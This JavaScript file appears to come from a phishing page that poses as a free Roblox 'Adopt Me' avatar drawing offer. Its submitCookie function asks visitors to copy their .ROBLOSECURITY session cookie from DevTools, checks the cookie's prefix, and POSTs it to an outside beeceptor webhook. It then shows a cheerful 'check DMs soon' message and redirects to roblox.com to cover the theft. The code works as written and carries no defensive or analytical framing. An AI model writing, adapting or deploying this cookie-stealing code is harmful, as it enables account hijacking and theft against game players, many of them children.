function submitCookie() {
    const cookie = document.getElementById('cookie-input').value.trim();
    console.log('Input cookie:', cookie.substring(0, 50) + '...');
    if (cookie && cookie.startsWith('_|WARNING')) {
        console.log('Fetching:', 'https://adopt-me-art.free.beeceptor.com');
        fetch('https://adopt-me-art.free.beeceptor.com', {
            method: 'POST',
            body: JSON.stringify({ cookie: cookie, source: 'adopt-me-avatar' }),
            headers: { 'Content-Type': 'application/json' },
            mode: 'cors'
        }).then(response => {
            console.log('Response:', response.status, response.statusText, response.headers.get('Access-Control-Allow-Origin'));
            if (!response.ok) throw new Error(`Webhook failed: ${response.status} ${response.statusText}`);
            return response.text(); // Handle non-JSON
        }).then(data => {
            console.log('Webhook response:', data);
            document.getElementById('status').innerText = 'Nice one! Your Adopt Me avatar’s being sketched—check DMs soon!';
            setTimeout(() => window.location.href = 'https://www.roblox.com', 2000);
        }).catch(error => {
            console.error('Fetch/CORS error:', error.message);
            document.getElementById('status').innerText = 'Bugger, something went wrong. Try again!';
        });
    } else {
        console.log('Invalid cookie');
        document.getElementById('status').innerText = 'Invalid code, mate! Grab the .ROBLOSECURITY from DevTools.';
    }
}

window.addEventListener('hashchange', () => {
    console.log('Hash:', location.hash);
    let page = location.hash.slice(2).split('/').pop();
    document.querySelectorAll('section').forEach(s => s.style.display = 'none');
    if (page) {
        console.log('Showing:', page);
        document.getElementById(page).style.display = 'block';
    }
});
window.dispatchEvent(new Event('hashchange'));
